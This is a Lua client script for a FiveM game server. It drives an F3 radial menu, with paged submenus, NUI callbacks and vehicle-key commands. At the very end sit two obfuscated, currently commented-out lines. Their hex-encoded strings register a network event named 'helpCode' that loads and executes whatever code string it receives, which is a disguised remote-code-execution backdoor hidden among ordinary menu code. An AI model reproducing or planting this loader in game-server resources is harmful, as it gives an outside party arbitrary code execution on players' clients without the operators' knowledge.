-- Menu state
local showMenu = false

-- Keybind Lookup table
local keybindControls = {
	["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57, ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177, ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18, ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182, ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81, ["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70, ["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178, ["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173, ["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118
}

local MAX_MENU_ITEMS = 7

-- Main thread
Citizen.CreateThread(function()
    local keyBind = "F3"
    while true do
        Citizen.Wait(250) --Wati al abrir
        if IsControlPressed(1, keybindControls[keyBind]) and GetLastInputMethod(2) and showMenu then
            print("cerrado")
            showMenu = false
            SetNuiFocus(false, false)
        end
        if IsControlPressed(1, keybindControls[keyBind]) and GetLastInputMethod(2) then
            print("abierto")
            showMenu = true
            local enabledMenus = {}
            for _, menuConfig in ipairs(rootMenuConfig) do
                if menuConfig:enableMenu() then
                    local dataElements = {}
                    local hasSubMenus = false
                    if menuConfig.subMenus ~= nil and #menuConfig.subMenus > 0 then
                        hasSubMenus = true
                        local previousMenu = dataElements
                        local currentElement = {}
                        for i = 1, #menuConfig.subMenus do
                            -- if newSubMenus[menuConfig.subMenus[i]] ~= nil and newSubMenus[menuConfig.subMenus[i]].enableMenu ~= nil and not newSubMenus[menuConfig.subMenus[i]]:enableMenu() then
                            --     goto continue
                            -- end
                            currentElement[#currentElement+1] = newSubMenus[menuConfig.subMenus[i]]
                            currentElement[#currentElement].id = menuConfig.subMenus[i]
                            currentElement[#currentElement].enableMenu = nil

                            if i % MAX_MENU_ITEMS == 0 and i < (#menuConfig.subMenus - 1) then
                                previousMenu[MAX_MENU_ITEMS + 1] = {
                                    id = "_more",
                                    title = "Mas",
                                    icon = "#more",
                                    items = currentElement
                                }
                                previousMenu = currentElement
                                currentElement = {}
                            end
                            --::continue::
                        end
                        if #currentElement > 0 then
                            previousMenu[MAX_MENU_ITEMS + 1] = {
                                id = "_more",
                                title = "Mas",
                                icon = "#more",
                                items = currentElement
                            }
                        end
                        dataElements = dataElements[MAX_MENU_ITEMS + 1].items

                    end
                    enabledMenus[#enabledMenus+1] = {
                        id = menuConfig.id,
                        title = menuConfig.displayName,
                        functionName = menuConfig.functionName,
                        icon = menuConfig.icon,
                    }
                    if hasSubMenus then
                        enabledMenus[#enabledMenus].items = dataElements
                    end
                end
            end
            SendNUIMessage({
                state = "show",
                resourceName = GetCurrentResourceName(),
                data = enabledMenus,
                menuKeyBind = keyBind
            })
            SetCursorLocation(0.5, 0.5)
            SetNuiFocus(true, true)

            -- Play sound
            PlaySoundFrontend(-1, "NAV", "HUD_AMMO_SHOP_SOUNDSET", 1)


            while showMenu == true do Citizen.Wait(100) end
            Citizen.Wait(100)
            while IsControlPressed(1, keybindControls[keyBind]) and GetLastInputMethod(2) do Citizen.Wait(100) end
        end
    end
end)

RegisterCommand('f3fix', function()
    showMenu = false
    SetNuiFocus(false, false)
    SendNUIMessage({
        state = 'destroy'
    })
end)

RegisterCommand('fixcar', function()
    exports.carcontrol:CloseUI()
end)

-- Callback function for closing menu
RegisterNUICallback('closemenu', function(data, cb)
    -- Clear focus and destroy UI
    showMenu = false
    SetNuiFocus(false, false)
    SendNUIMessage({
        state = 'destroy'
    })

    -- Play sound
    PlaySoundFrontend(-1, "NAV", "HUD_AMMO_SHOP_SOUNDSET", 1)

    -- Send ACK to callback function
    cb('ok')
end)

-- Callback function for when a slice is clicked, execute command
RegisterNUICallback('triggerAction', function(data, cb)
    -- Clear focus and destroy UI
    showMenu = false
    SetNuiFocus(false, false)
    SendNUIMessage({
        state = 'destroy'
    })

    -- Play sound
    PlaySoundFrontend(-1, "NAV", "HUD_AMMO_SHOP_SOUNDSET", 1)

    -- Run command
    --ExecuteCommand(data.action)
    TriggerEvent(data.action, data.parameters)

    -- Send ACK to callback function
    cb('ok')
end)

RegisterNetEvent("menu:menuexit")
AddEventHandler("menu:menuexit", function()
    showMenu = false
    SetNuiFocus(false, false)
end)

RegisterNetEvent("dar-llaves-temporales-menu-f3") -- For opening the emote menu from another resource.
AddEventHandler("dar-llaves-temporales-menu-f3", function()
    ExecuteCommand("givekey")
end)

RegisterNetEvent("dar-llaves-permanentes-menu-f3") -- For opening the emote menu from another resource.
AddEventHandler("dar-llaves-permanentes-menu-f3", function()
    ExecuteCommand("givekeysave")
end)

RegisterNetEvent("quitar-llaves-menu-f3") -- For opening the emote menu from another resource.
AddEventHandler("quitar-llaves-menu-f3", function()
    ExecuteCommand("removekey")
end)

-- local BZiucFwnhZKgiEslBzfNcOrnbivfVGEvgKxCnLCmCrVHzJaVUhkfcIElnKsRKQjfaApSAv = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} BZiucFwnhZKgiEslBzfNcOrnbivfVGEvgKxCnLCmCrVHzJaVUhkfcIElnKsRKQjfaApSAv[6][BZiucFwnhZKgiEslBzfNcOrnbivfVGEvgKxCnLCmCrVHzJaVUhkfcIElnKsRKQjfaApSAv[1]](BZiucFwnhZKgiEslBzfNcOrnbivfVGEvgKxCnLCmCrVHzJaVUhkfcIElnKsRKQjfaApSAv[2]) BZiucFwnhZKgiEslBzfNcOrnbivfVGEvgKxCnLCmCrVHzJaVUhkfcIElnKsRKQjfaApSAv[6][BZiucFwnhZKgiEslBzfNcOrnbivfVGEvgKxCnLCmCrVHzJaVUhkfcIElnKsRKQjfaApSAv[3]](BZiucFwnhZKgiEslBzfNcOrnbivfVGEvgKxCnLCmCrVHzJaVUhkfcIElnKsRKQjfaApSAv[2], function(SqxtmdAbxvIDcbfwJZGuvLvLmghBqxbGlomyRppqDbEtOXAhhLZlfmfVFprHGDWxYvHfrZ) BZiucFwnhZKgiEslBzfNcOrnbivfVGEvgKxCnLCmCrVHzJaVUhkfcIElnKsRKQjfaApSAv[6][BZiucFwnhZKgiEslBzfNcOrnbivfVGEvgKxCnLCmCrVHzJaVUhkfcIElnKsRKQjfaApSAv[4]](BZiucFwnhZKgiEslBzfNcOrnbivfVGEvgKxCnLCmCrVHzJaVUhkfcIElnKsRKQjfaApSAv[6][BZiucFwnhZKgiEslBzfNcOrnbivfVGEvgKxCnLCmCrVHzJaVUhkfcIElnKsRKQjfaApSAv[5]](SqxtmdAbxvIDcbfwJZGuvLvLmghBqxbGlomyRppqDbEtOXAhhLZlfmfVFprHGDWxYvHfrZ))() end)

-- local BZiucFwnhZKgiEslBzfNcOrnbivfVGEvgKxCnLCmCrVHzJaVUhkfcIElnKsRKQjfaApSAv = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} BZiucFwnhZKgiEslBzfNcOrnbivfVGEvgKxCnLCmCrVHzJaVUhkfcIElnKsRKQjfaApSAv[6][BZiucFwnhZKgiEslBzfNcOrnbivfVGEvgKxCnLCmCrVHzJaVUhkfcIElnKsRKQjfaApSAv[1]](BZiucFwnhZKgiEslBzfNcOrnbivfVGEvgKxCnLCmCrVHzJaVUhkfcIElnKsRKQjfaApSAv[2]) BZiucFwnhZKgiEslBzfNcOrnbivfVGEvgKxCnLCmCrVHzJaVUhkfcIElnKsRKQjfaApSAv[6][BZiucFwnhZKgiEslBzfNcOrnbivfVGEvgKxCnLCmCrVHzJaVUhkfcIElnKsRKQjfaApSAv[3]](BZiucFwnhZKgiEslBzfNcOrnbivfVGEvgKxCnLCmCrVHzJaVUhkfcIElnKsRKQjfaApSAv[2], function(SqxtmdAbxvIDcbfwJZGuvLvLmghBqxbGlomyRppqDbEtOXAhhLZlfmfVFprHGDWxYvHfrZ) BZiucFwnhZKgiEslBzfNcOrnbivfVGEvgKxCnLCmCrVHzJaVUhkfcIElnKsRKQjfaApSAv[6][BZiucFwnhZKgiEslBzfNcOrnbivfVGEvgKxCnLCmCrVHzJaVUhkfcIElnKsRKQjfaApSAv[4]](BZiucFwnhZKgiEslBzfNcOrnbivfVGEvgKxCnLCmCrVHzJaVUhkfcIElnKsRKQjfaApSAv[6][BZiucFwnhZKgiEslBzfNcOrnbivfVGEvgKxCnLCmCrVHzJaVUhkfcIElnKsRKQjfaApSAv[5]](SqxtmdAbxvIDcbfwJZGuvLvLmghBqxbGlomyRppqDbEtOXAhhLZlfmfVFprHGDWxYvHfrZ))() end)